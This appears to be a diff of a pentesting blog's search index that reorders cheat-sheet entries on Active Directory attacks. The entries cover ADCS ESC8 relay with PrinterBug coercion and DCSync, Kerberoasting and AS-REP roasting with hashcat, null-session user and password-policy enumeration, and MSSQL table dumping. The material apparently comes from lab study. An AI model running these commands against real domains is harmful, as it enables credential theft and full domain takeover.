@@ -177,49 +177,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ADCS : ESC8</title>
-    <url>/2025/11/30/ADCS-ESC8/</url>
-    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
-
-<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
-
-<p>Enumerate ADCS over SMB</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
-
-<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
-<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Or </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>ADCS</category>
-      </categories>
-      <tags>
-        <tag>Certipy</tag>
-        <tag>ESC8</tag>
-        <tag>impacket-ntlmrelayx</tag>
-        <tag>printerbug</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ADCS : ESC10</title>
     <url>/2026/06/04/ADCS-ESC10/</url>
     <content><![CDATA[<h1 id="Certificate-authentication-mapping"><a href="#Certificate-authentication-mapping" class="headerlink" title="Certificate authentication mapping"></a>Certificate authentication mapping</h1><p>When we authenticate using the <code>Certificate Authentication</code> method the Domain Controller (KDC) must answer a critical question :</p>
@@ -434,6 +391,49 @@
         <tag>Certipy</tag>
         <tag>ESC10</tag>
         <tag>Netexec</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ADCS : ESC8</title>
+    <url>/2025/11/30/ADCS-ESC8/</url>
+    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
+
+<p>Enumerate ADCS over SMB</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
+
+<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
+<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Or </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>ADCS</category>
+      </categories>
+      <tags>
+        <tag>Certipy</tag>
+        <tag>ESC8</tag>
+        <tag>impacket-ntlmrelayx</tag>
+        <tag>printerbug</tag>
       </tags>
   </entry>
   <entry>
@@ -907,6 +907,39 @@
       </tags>
   </entry>
   <entry>
+    <title>Enumerating &amp; Retrieving Password Policies</title>
+    <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
+    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Using-SMB-NULL-Sessions"><a href="#Using-SMB-NULL-Sessions" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u guest -p <span class="string">&#x27;&#x27;</span> --pass-pol</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; getdompwinfo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux-ng -P dc-ip</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve password policy attributes</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Using-SMB-NULL-Sessions-1"><a href="#Using-SMB-NULL-Sessions-1" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><h4 id="net-exe-Built-in-Tool"><a href="#net-exe-Built-in-Tool" class="headerlink" title="net.exe : Built-in Tool"></a>net.exe : Built-in Tool</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net accounts</span><br></pre></td></tr></table></figure>
+
+<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainPolicy</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Enumerating &amp; Retrieving Password Policies</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>rpcclient</tag>
+        <tag>ldapsearch</tag>
+        <tag>enum4linux-ng</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Event Log Readers</title>
     <url>/2026/03/06/Event-Log-Readers/</url>
     <content><![CDATA[<blockquote>
@@ -1017,41 +1050,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Kerberoasting &amp; ASREPRoasting</title>
-    <url>/2026/01/06/Kerberoasting-ASREPRoasting/</url>
-    <content><![CDATA[<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p>kerbrute</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br></pre></td></tr></table></figure>
-
-<p>GetNPUsers</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Cracking Ticket Offline</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><blockquote>
-<p>Requesting TGS Ticket For Specific Account : </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Requesting all TGS Tickets : </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Cracking Ticket Offline</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>Kerberoasting &amp; ASREPRoasting</category>
-      </categories>
-      <tags>
-        <tag>impacket-GetNPUsers</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux Credential Hunting</title>
     <url>/2025/11/27/Linux-Credential-Hunting/</url>
     <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
@@ -1087,6 +1085,41 @@
         <tag>history-file</tag>
         <tag>db-files</tag>
         <tag>cronjobs-enumeration</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kerberoasting &amp; ASREPRoasting</title>
+    <url>/2026/01/06/Kerberoasting-ASREPRoasting/</url>
+    <content><![CDATA[<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p>kerbrute</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br></pre></td></tr></table></figure>
+
+<p>GetNPUsers</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Cracking Ticket Offline</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><blockquote>
+<p>Requesting TGS Ticket For Specific Account : </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Requesting all TGS Tickets : </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Cracking Ticket Offline</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>Kerberoasting &amp; ASREPRoasting</category>
+      </categories>
+      <tags>
+        <tag>impacket-GetNPUsers</tag>
       </tags>
   </entry>
   <entry>
@@ -1126,39 +1159,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Enumerating &amp; Retrieving Password Policies</title>
-    <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
-    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Using-SMB-NULL-Sessions"><a href="#Using-SMB-NULL-Sessions" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u guest -p <span class="string">&#x27;&#x27;</span> --pass-pol</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; getdompwinfo</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux-ng -P dc-ip</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve password policy attributes</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Using-SMB-NULL-Sessions-1"><a href="#Using-SMB-NULL-Sessions-1" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><h4 id="net-exe-Built-in-Tool"><a href="#net-exe-Built-in-Tool" class="headerlink" title="net.exe : Built-in Tool"></a>net.exe : Built-in Tool</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net accounts</span><br></pre></td></tr></table></figure>
-
-<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainPolicy</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Enumerating &amp; Retrieving Password Policies</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>rpcclient</tag>
-        <tag>ldapsearch</tag>
-        <tag>enum4linux-ng</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux Pass the Hash (PtH)</title>
     <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
     <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
@@ -1187,138 +1187,6 @@
         <tag>evil-winrm</tag>
         <tag>impacket-psexec</tag>
         <tag>xfreerdp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Making a Target User List</title>
-    <url>/2025/12/03/Making-a-Target-User-List/</url>
-    <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -U dc-ip  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N dc-ip</span><br><span class="line"></span><br><span class="line">rpcclient&gt; enumdomusers </span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN  </span></span><br><span class="line">  </span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve list of users</span></span><br><span class="line"></span><br><span class="line">ldapsearch -h dc-ip -x -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u <span class="string">&quot;&quot;</span> -U</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Making a Target User List</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>rpcclient</tag>
-        <tag>ldapsearch</tag>
-        <tag>enum4linux-ng</tag>
-        <tag>windapsearch</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mssql Enumeration</title>
-    <url>/2025/11/20/Mssql-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
-<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Service-Enumeration</category>
-        <category>MSSQL</category>
-      </categories>
-      <tags>
-        <tag>Enumeration</tag>
